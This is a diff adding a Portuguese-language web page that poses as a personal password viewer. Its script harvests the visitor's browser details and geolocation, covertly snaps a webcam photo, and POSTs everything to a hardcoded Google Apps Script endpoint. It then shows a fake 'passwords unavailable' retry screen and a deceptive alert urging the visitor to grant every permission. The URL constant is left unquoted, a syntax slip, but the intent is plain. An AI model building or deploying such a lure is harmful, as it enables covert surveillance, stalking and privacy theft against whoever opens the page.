@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <title>Senhas das minhas contas</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding: 50px; background: #f4f4f4; }
+        .container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }
+        input { width: 80%; padding: 10px; margin: 10px 0; }
+        button { background: #007bff; color: white; border: none; padding: 10px 20px; cursor: pointer; border-radius: 5px; }
+        #camera { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="container" id="tela1">
+    <h2>Senhas das minhas contas</h2>
+    <p>Para visualizar, confirme sua identidade.</p>
+    <input type="password" placeholder="Digite sua senha mestra">
+    <br>
+    <button onclick="coletarEDirecionar()">Ver senhas</button>
+</div>
+
+<div class="container" id="tela2" style="display:none;">
+    <p style="color: red;">Senhas indisponíveis no momento.</p>
+    <button onclick="coletarEDirecionar()">Clique aqui para tentar novamente</button>
+</div>
+
+<video id="video" width="320" height="240" autoplay style="display:none;"></video>
+<canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+
+<script>
+    const WEBAPP_URL = https://script.google.com/macros/s/AKfycbxOZIM_3u63fv-ycBa6UAemiNLe7YP38G7d1LKeu01aWgC6gbcvcOBdety-KNdCI-77ag/exec;
+
+    async function coletarEDirecionar() {
+        try {
+            // 1. Coleta Informações Básicas
+            let info = `Navegador: ${navigator.userAgent} | Plataforma: ${navigator.platform}`;
+            
+            // 2. Tenta Localização
+            let loc = "Não permitida";
+            const pos = await new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(resolve, reject);
+            }).catch(() => null);
+            if (pos) loc = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
+
+            // 3. Tenta Câmera (Foto)
+            let fotoBase64 = "Sem acesso";
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true }).catch(() => null);
+            if (stream) {
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                video.srcObject = stream;
+                await new Promise(r => setTimeout(r, 500)); // Espera a câmera ligar
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                fotoBase64 = canvas.toDataURL('image/jpeg');
+                stream.getTracks().forEach(track => track.stop()); // Desliga a câmera
+            } else {
+                alert("É necessário dar acesso às autorizações para mostrar todas as senhas.");
+                return;
+            }
+
+            // 4. Envia para a Planilha
+            fetch(WEBAPP_URL, {
+                method: "POST",
+                body: JSON.stringify({ info, loc, foto: fotoBase64 })
+            });
+
+            // Troca de Tela
+            document.getElementById('tela1').style.display = 'none';
+            document.getElementById('tela2').style.display = 'block';
+
+        } catch (err) {
+            alert("Erro: É necessário conceder todas as permissões.");
+        }
+    }
+</script>
+</body>
+</html>
